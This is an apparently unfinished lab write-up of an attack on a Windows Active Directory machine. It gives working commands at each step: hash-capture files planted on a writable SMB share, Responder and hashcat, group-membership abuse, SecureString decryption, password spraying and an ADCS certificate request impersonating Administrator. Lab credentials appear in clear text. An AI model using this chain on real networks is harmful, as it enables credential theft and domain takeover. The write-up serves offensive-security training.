#InProgress 
```IP
192.168.249.30
```
# Enumeration
## SMB
```
nxc smb 192.168.249.30 -u 'guest' -p '' --shares
```
we can access and write some directories
```
smbclient //192.168.249.30/nara -U nara-security.com\guest
```
we find important.txt. We can deduct that some kind of phishing attack may work. I first tried with .exe or .odt to no avail.
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212163917.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212163939.png?raw=true)
## Kerberos
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212163540.png?raw=true)
got some users
```
nara
administrator
guest
```
## HTTP

# Exploitation
with hashgrab.py we can force authentication to our machine if a user clicks on any of our generated files
https://github.com/xct/hashgrab
```
python hashgrab/hashgrab.py 192.168.45.189 hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212170454.png?raw=true)
we upload it to smb Documents and we get the hash with
```
sudo responder -I tun0
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212170708.png?raw=true)
We can crack it with hashcat
```
hashcat -m 5600 files/tracy.hash /usr/share/wordlists/rockyou.txt --force
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212171126.png?raw=true)
with nxc we can see some hits on rdp and ldap but it doesn't say pwned...
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212172000.png?raw=true)
we can't access but we can run bloodhound
```
bloodhound-python -d nara-security.com -c all -u tracy.white -p 'zqwj041FGX' -ns 192.168.249.30 --zip
```
We find out that we have generic all over remote access
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212175735.png?raw=true)
So we execute the following command in order to add tracy.white to group "remote access":
```
net rpc group addmem "Remote Access" "tracy.white" -U "nara-security.com"/"tracy.white"%"zqwj041FGX" -S "nara-security.com"
```
```
evil-winrm -i 192.168.249.30 -u tracy.white -p 'zqwj041FGX'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212175643.png?raw=true)

# PrivEsc

## Manual

right in the documents directory we can find the following file
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212180025.png?raw=true)
seems like a hash.
Let's think as a user. the user encrypted here something, likely a password. Something he could have googled is "How to encrypt a password in windows powershell?"
If we google exactly that we get some answers as
https://medium.com/@josephjhinshaw/powershell-encryption-38a044db3942
Which have some powershell commands as `ConvertTo-SecureString`.
So the question we should google would be "How to decrypt powershell secure string?"
StackOverflow will give us the answer:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241212182706.png?raw=true)
https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password
We asume then that this is a standart ciphered string obtained with the convertfrom-securestring cmdlet. Following the commands below we can decrypt this encrypted string:
```
$credentials = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b'
```
```
$secure = convertTo-securestring -string $credentials
```
```
$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($secure)
```
```
$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
```
```
[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
```
```
$result
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213091156.png?raw=true)
We obtain the following string:
```
hHO_S9gff7ehXw
```
We will spray the password now. But first we need a complete user list. I've done this by bruteforcing the RIDs with nxc
```
nxc smb 192.168.132.30 -u 'tracy.white' -p 'zqwj041FGX' --rid-brute 3000 > users2.txt
```
After some data cleaning, we have our clean user list and we can use it to spray the password effectively
```
nxc winrm 192.168.132.30 -u users2.txt -p 'hHO_S9gff7ehXw'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213092921.png?raw=true)
We have pwned Jodie.Summers.
```
evil-winrm -i 192.168.132.30 -u jodie.summers -p 'hHO_S9gff7ehXw'
```
After some enumeration, we observe that jodie.summers belongs to Enrollment group:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213131507.png?raw=true)
In the nmap scan we can see that this machine is also a Certificate Authority (CA).
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213131213.png?raw=true)
We can check for CA related vulnerabilities with certipy-ad tool as shown below:
```
certipy-ad find -vulnerable -stdout -u Jodie.Summers@192.168.132.30 -p 'hHO_S9gff7ehXw'
```
In the official github webpage we can find how to leverage these attacks:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241213131321.png?raw=true)
The tool indicates that Enrollment group has dangerous permissions
```
certipy-ad req -username Jodie.Summers@192.168.132.30 -password hHO_S9gff7ehXw -ca NARA-CA -target nara-security.com -template NaraUser -upn Administrator@nara-security.com
```

## Automated

### Peass
### Mimikatz

# Lateral Movement
